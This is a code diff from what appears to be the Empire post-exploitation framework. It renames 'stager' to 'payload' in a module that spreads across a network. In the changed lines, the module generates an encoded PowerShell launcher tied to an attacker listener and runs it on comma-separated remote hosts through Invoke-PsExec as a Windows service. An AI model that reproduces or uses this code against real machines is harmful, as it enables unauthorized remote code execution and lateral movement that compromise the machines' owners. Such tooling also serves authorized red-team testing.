@@ -9,7 +9,7 @@ class Module:
 
             'Author': ['@harmj0y'],
 
-            'Description': ('Executes a stager on remote hosts using PsExec type functionality.'),
+            'Description': ('Executes a payload on remote hosts using PsExec type functionality.'),
 
             'Background' : True,
 
@@ -43,7 +43,7 @@ class Module:
                 'Value'         :   ''
             },
             'ComputerName' : {
-                'Description'   :   'Host[s] to execute the stager on, comma separated.',
+                'Description'   :   'Host[s] to execute the payload on, comma separated.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
@@ -137,15 +137,15 @@ class Module:
             else:
 
                 # generate the PowerShell one-liner with all of the proper options set
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+                launcher = self.mainMenu.payloads.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
 
                 if launcher == "":
                     print helpers.color("[!] Error in launcher generation.")
                     return ""
                 else:
 
-                    stagerCmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
-                    scriptEnd += "Invoke-PsExec -ComputerName %s -ServiceName \"%s\" -Command \"%s\"" % (computerName, serviceName, stagerCmd)
+                    payloadCmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
+                    scriptEnd += "Invoke-PsExec -ComputerName %s -ServiceName \"%s\" -Command \"%s\"" % (computerName, serviceName, payloadCmd)
 
 
         scriptEnd += "| Out-String | %{$_ + \"`n\"};"
